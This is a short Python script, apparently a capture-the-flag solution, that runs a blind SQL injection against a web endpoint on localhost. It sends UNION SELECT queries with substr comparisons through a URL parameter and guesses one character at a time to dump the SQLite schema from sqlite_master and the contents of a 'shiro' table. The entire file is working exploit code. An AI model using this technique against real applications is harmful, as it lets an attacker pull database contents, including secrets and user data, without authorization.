from requests import get
from urllib.parse import quote_plus
from sys import stdout

import warnings
warnings.filterwarnings('ignore')

chars = "abcdefghijklmnopqrstuvwxyz"
chars += chars.upper()
chars += " _{}\"!@#$%^&*()[];:.,/?><\|"

def blank(q):
    url = "http://localhost:10201/blank/?$={}"
    return get(url.format(quote_plus(q)), verify=False).text

def guess(table, column, i, char):
    query = "' WHERE 0 UNION SELECT 1 FROM {table} "
    query += "WHERE substr({column}, {i}, 1) = '{char}"
    q = query.format(column=column, table=table, i=i, char=char)
    return blank(q) == "1"

def dump(table, column):
    i = 1
    result = ""
    while True:
        found = False
        for c in chars:
            stdout.write("\r%s%s" % (result, c))
            stdout.flush()
            if guess(table, column, i, c):
                result += c
                found = True
                break
        i += 1
        if not found:
            print("\r%s " % result)
            break

dump('sqlite_master', 'name')
dump('sqlite_master', 'sql')
dump('shiro', 'white')
